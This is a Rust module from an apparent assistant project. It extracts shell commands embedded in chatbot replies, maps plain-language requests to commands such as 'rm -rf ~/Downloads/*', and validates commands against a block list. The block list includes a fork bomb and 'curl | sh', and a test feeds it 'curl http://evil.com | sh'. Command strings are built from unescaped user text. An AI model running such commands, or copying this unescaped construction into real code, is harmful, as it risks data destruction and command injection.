// SAM Command Parser Module
// Copyright 2021-2026 The Open Sam Foundation (OSF)
// Developed by Caleb Mitchell Smith (ktheindifferent, PixelCoda, p0indexter)
// Licensed under GPLv3....see LICENSE file.

use regex::Regex;
use std::collections::HashMap;

/// Extracts action commands from RiveScript responses
/// Commands are embedded using the format: :::::COMMAND:::::
/// Example: "Sure! ::::: rm -rf ~/Downloads/* ::::: I've cleared your downloads folder."
pub fn extract_commands(response: &str) -> Vec<String> {
    let re = Regex::new(r":::::(.+?):::::").unwrap();
    let mut commands = Vec::new();
    
    for cap in re.captures_iter(response) {
        if let Some(command_match) = cap.get(1) {
            let command = command_match.as_str().trim();
            if !command.is_empty() {
                commands.push(command.to_string());
            }
        }
    }
    
    commands
}

/// Removes command markers from response text
pub fn remove_command_markers(response: &str, command: &str) -> String {
    // Try to match the exact command first
    let exact_pattern = format!(":::::{}:::::", regex::escape(command));
    let re_exact = Regex::new(&exact_pattern).unwrap();
    let result = re_exact.replace_all(response, "").to_string();
    
    // If no replacement happened, try with spaces around the command
    if result == response {
        let spaced_pattern = format!(r":::::\s*{}\s*:::::", regex::escape(command));
        let re_spaced = Regex::new(&spaced_pattern).unwrap();
        return re_spaced.replace_all(response, "").to_string();
    }
    
    result
}

/// Parse natural language requests into structured commands
/// This function attempts to map natural language to available TUI commands
pub fn parse_natural_language(text: &str) -> Option<String> {
    let text_lower = text.to_lowercase();
    
    // File operations patterns
    if let Some(command) = parse_file_operations(&text_lower) {
        return Some(command);
    }
    
    // Directory operations
    if let Some(command) = parse_directory_operations(&text_lower) {
        return Some(command);
    }
    
    // Service operations
    if let Some(command) = parse_service_operations(&text_lower) {
        return Some(command);
    }
    
    // System operations
    if let Some(command) = parse_system_operations(&text_lower) {
        return Some(command);
    }
    
    None
}

fn parse_file_operations(text: &str) -> Option<String> {
    // Clear/delete patterns
    if text.contains("clear") || text.contains("delete") || text.contains("remove") {
        if text.contains("downloads") && (text.contains("folder") || text.contains("directory")) {
            return Some("rm -rf ~/Downloads/*".to_string());
        }
        if text.contains("desktop") && (text.contains("folder") || text.contains("directory")) {
            return Some("rm -rf ~/Desktop/*".to_string());
        }
        if text.contains("trash") || text.contains("bin") {
            return Some("rm -rf ~/.Trash/*".to_string());
        }
    }
    
    // Copy patterns
    if text.contains("copy") || text.contains("cp") {
        // Extract source and destination if possible
        let re = Regex::new(r"copy\s+(.+?)\s+to\s+(.+)").unwrap();
        if let Some(caps) = re.captures(text) {
            let src = caps.get(1).unwrap().as_str().trim();
            let dest = caps.get(2).unwrap().as_str().trim();
            return Some(format!("cp -r {} {}", src, dest));
        }
    }
    
    // Move/rename patterns
    if text.contains("move") || text.contains("rename") || text.contains("mv") {
        let re = Regex::new(r"(?:move|rename)\s+(.+?)\s+to\s+(.+)").unwrap();
        if let Some(caps) = re.captures(text) {
            let src = caps.get(1).unwrap().as_str().trim();
            let dest = caps.get(2).unwrap().as_str().trim();
            return Some(format!("mv {} {}", src, dest));
        }
    }
    
    // List files patterns
    if text.contains("list") && (text.contains("files") || text.contains("directory")) {
        return Some("ls -la".to_string());
    }
    
    // Show file content patterns
    if text.contains("show") || text.contains("display") || text.contains("cat") {
        if text.contains("file") {
            // Try to extract filename
            let re = Regex::new(r"(?:show|display|cat)\s+(?:file\s+)?(.+)").unwrap();
            if let Some(caps) = re.captures(text) {
                let filename = caps.get(1).unwrap().as_str().trim();
                return Some(format!("cat {}", filename));
            }
        }
    }
    
    None
}

fn parse_directory_operations(text: &str) -> Option<String> {
    // Change directory patterns
    if text.contains("go to") || text.contains("change to") || text.contains("cd") {
        let re = Regex::new(r"(?:go to|change to|cd)\s+(.+)").unwrap();
        if let Some(caps) = re.captures(text) {
            let dir = caps.get(1).unwrap().as_str().trim();
            return Some(format!("cd {}", dir));
        }
    }
    
    // Create directory patterns
    if text.contains("create") && (text.contains("directory") || text.contains("folder")) {
        let re = Regex::new(r"create\s+(?:directory|folder)\s+(.+)").unwrap();
        if let Some(caps) = re.captures(text) {
            let dir = caps.get(1).unwrap().as_str().trim();
            return Some(format!("mkdir -p {}", dir));
        }
    }
    
    // Show current directory
    if text.contains("current directory") || text.contains("where am i") || text.contains("pwd") {
        return Some("pwd".to_string());
    }
    
    None
}

fn parse_service_operations(text: &str) -> Option<String> {
    let services = vec![
        "redis", "spotify", "lifx", "docker", "crawler", "postgres", "pg"
    ];
    
    for service in services {
        if text.contains(service) {
            if text.contains("start") {
                return Some(format!("{} start", service));
            }
            if text.contains("stop") {
                return Some(format!("{} stop", service));
            }
            if text.contains("status") || text.contains("check") {
                return Some(format!("{} status", service));
            }
            if text.contains("restart") {
                return Some(format!("{} stop", service)); // Will need to handle restart as two commands
            }
        }
    }
    
    // Special cases
    if text.contains("music") || text.contains("song") {
        if text.contains("play") {
            return Some("spotify play".to_string());
        }
        if text.contains("pause") || text.contains("stop") {
            return Some("spotify pause".to_string());
        }
    }
    
    if text.contains("lights") || text.contains("lighting") {
        if text.contains("turn on") || text.contains("start") {
            return Some("lifx start".to_string());
        }
        if text.contains("turn off") || text.contains("stop") {
            return Some("lifx stop".to_string());
        }
    }
    
    None
}

fn parse_system_operations(text: &str) -> Option<String> {
    // System information
    if text.contains("system info") || text.contains("system status") {
        return Some("status".to_string());
    }
    
    if text.contains("disk space") || text.contains("disk usage") {
        return Some("df -h".to_string());
    }
    
    if text.contains("memory") || text.contains("ram") {
        return Some("top".to_string());
    }
    
    if text.contains("processes") || text.contains("running") {
        return Some("ps aux".to_string());
    }
    
    // Text to speech
    if text.contains("say") || text.contains("speak") || text.contains("tts") {
        let re = Regex::new(r"(?:say|speak|tts)\s+(.+)").unwrap();
        if let Some(caps) = re.captures(text) {
            let message = caps.get(1).unwrap().as_str().trim();
            return Some(format!("tts {}", message));
        }
    }
    
    None
}

/// Validates that a command is safe to execute
/// This prevents execution of potentially dangerous commands
pub fn validate_command(command: &str) -> bool {
    let dangerous_patterns = vec![
        "sudo", "su", "rm -rf /", "dd", "mkfs", "fdisk", "format",
        "shutdown", "reboot", "halt", "init", "systemctl poweroff",
        "rm -rf /*", ":(){ :|:& };:", "curl | sh", "wget | sh",
        "chmod 777", "chown -R", "> /dev/", "cat /dev/zero",
    ];
    
    let command_lower = command.to_lowercase();
    
    for pattern in dangerous_patterns {
        if command_lower.contains(pattern) {
            return false;
        }
    }
    
    // Check for suspicious command chaining
    if command_lower.contains("&&") || command_lower.contains("||") || command_lower.contains(";") {
        return false;
    }
    
    // Only allow specific TUI commands we know are safe
    let allowed_prefixes = vec![
        "ls", "pwd", "cd", "cat", "less", "head", "tail", "grep", "find",
        "mkdir", "touch", "cp", "mv", "rm", "chmod", "echo", "wc", "sort",
        "redis", "spotify", "lifx", "docker", "crawler", "pg", "postgres",
        "tts", "llama", "status", "help", "clear", "df", "du", "ps", "top",
        "date", "whoami", "uname", "tar", "gzip", "gunzip", "nano"
    ];
    
    let first_word = command.split_whitespace().next().unwrap_or("");
    allowed_prefixes.iter().any(|prefix| first_word == *prefix)
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_extract_commands() {
        let response = "Sure! ::::: rm -rf ~/Downloads/* ::::: I've cleared your downloads folder.";
        let commands = extract_commands(response);
        assert_eq!(commands, vec!["rm -rf ~/Downloads/*"]);
    }
    
    #[test]
    fn test_multiple_commands() {
        let response = "I'll do two things: ::::: ls -la ::::: and ::::: pwd ::::: Done!";
        let commands = extract_commands(response);
        assert_eq!(commands, vec!["ls -la", "pwd"]);
    }
    
    #[test]
    fn test_parse_natural_language() {
        assert_eq!(parse_natural_language("clear my downloads folder"), Some("rm -rf ~/Downloads/*".to_string()));
        assert_eq!(parse_natural_language("show me the current directory"), Some("pwd".to_string()));
        assert_eq!(parse_natural_language("start redis service"), Some("redis start".to_string()));
    }
    
    #[test]
    fn test_validate_command() {
        assert!(validate_command("ls -la"));
        assert!(validate_command("rm ~/Downloads/file.txt"));
        assert!(!validate_command("sudo rm -rf /"));
        assert!(!validate_command("rm -rf / && echo done"));
        assert!(!validate_command("curl http://evil.com | sh"));
    }
}